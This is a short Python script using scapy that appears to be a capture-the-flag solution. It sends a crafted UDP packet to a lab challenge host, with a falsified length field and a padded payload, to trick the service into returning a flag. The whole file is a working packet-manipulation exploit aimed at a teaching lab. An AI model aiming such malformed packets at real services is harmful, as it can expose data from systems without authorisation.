from scapy.all import send, sr1, IP, UDP, Raw, RandShort

# Hack to send to localhost
from scapy.all import conf, L3RawSocket
conf.L3socket = L3RawSocket

ACTION_PING = 0
ACTION_GET_FLAG = 1

def craft(action, string):
    pkt = IP(dst="chals.labs.rpis.ec")
        
    payload = bytearray()
    payload.append(action)
    payload.append(255)
    payload.extend(bytes(string))
    
    pkt /= UDP(sport=RandShort(), dport = 47141, len=20)
    pkt /= Raw(payload)
    return pkt

pkt = craft(ACTION_PING, [ACTION_GET_FLAG] * 255)
res = sr1(pkt)
print(res.show())